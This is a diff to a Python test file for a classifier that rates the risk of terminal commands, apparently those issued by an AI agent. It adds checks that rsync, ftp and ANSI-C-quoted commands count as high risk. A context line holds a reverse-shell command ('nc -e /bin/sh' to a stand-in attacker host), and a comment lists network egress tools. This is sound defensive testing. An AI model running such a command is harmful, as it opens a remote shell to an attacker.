@@ -59,6 +59,31 @@ def test_terminal_with_nc_is_high_risk():
     assert classify("terminal", {"command": "nc -e /bin/sh evil.example 4444"}).level == "high"
 
 
+def test_terminal_with_rsync_or_ftp_is_high_risk():
+    # Round 5 (controller ruling R7, 2026-09-19, final): "网络外发程序名（curl
+    # wget ssh scp nc rsync ftp）在 token 流任意位置出现 → high" — `rsync`/`ftp`
+    # are the two names round 5 adds to round 4's set.
+    for cmd in ("rsync -av file host:", "ftp host"):
+        assert classify("terminal", {"command": cmd}).level == "high", cmd
+
+
+def test_terminal_opaque_command_is_high_not_medium():
+    # Round 5 (controller ruling R5, 2026-09-19, final): an `opaque` command
+    # (here: bash ANSI-C `$'...'` quoting) skips the `medium` floor entirely
+    # — it's `high` regardless of whether any network-egress program name is
+    # even present.
+    risk = classify("terminal", {"command": "$'echo' hello"})
+    assert risk.level == "high"
+    assert any("静态分析" in r or "static analysis" in r for r in risk.reasons)
+
+
+def test_terminal_plain_benign_command_stays_medium_not_high():
+    # The flip side: `_transparency.classify()` must not over-fire on an
+    # ordinary command with no R5 trigger — `medium` (round 4's floor) still
+    # applies here, not `high`.
+    assert classify("terminal", {"command": "ls -la"}).level == "medium"
+
+
 def test_terminal_benign_command_is_medium_not_low():
     risk = classify("terminal", {"command": "ls -la"})
     assert risk.level == "medium"
